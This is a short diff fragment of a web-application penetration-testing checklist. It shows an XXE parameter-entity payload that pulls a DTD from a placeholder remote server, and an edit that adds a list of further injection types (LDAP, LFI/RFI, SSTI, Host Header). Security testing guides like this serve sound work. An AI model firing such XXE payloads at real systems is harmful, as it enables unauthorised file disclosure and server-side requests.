@@ -266,7 +266,7 @@ Parameter ENTITY can be only used within the DTD, we can use the below payload t
  <!DOCTYPE data [<!ENTITY % remote SYSTEM "http://remoteserverIP/index.html">%remote;]>
 ```
 
-## 7. Business Logic Testing
+3.20. You can check for other injection attacks such as `LDAP injection`, `LFI and RFI`, `Server Side Template Injection`, `Host Header Injection`..etc check https://github.com/me-redteam/wstg/tree/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing.
 
 
 ## 8. Error Handling
